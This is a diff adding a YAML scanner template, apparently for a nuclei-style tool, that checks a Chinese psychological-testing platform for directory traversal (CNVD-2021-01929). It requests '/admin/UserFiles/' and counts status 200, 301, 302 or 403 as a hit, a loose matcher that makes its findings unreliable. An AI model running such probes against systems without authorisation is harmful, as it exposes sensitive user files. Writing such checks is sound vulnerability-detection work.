@@ -1,0 +1,18 @@
+id: cnvd-2021-01929
+info:
+  author: pocscanner
+  description: 安徽阳光心健心理咨询有限公司心理测量平台存在目录遍历漏洞，攻击者可利用该漏洞获取敏感信息。
+  name: 安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929
+  reference: []
+  severity: high
+requests:
+- matchers:
+  - status:
+    - 200
+    - 301
+    - 302
+    - 403
+    type: status
+  method: GET
+  path:
+  - '{{BaseURL}}/admin/UserFiles/'
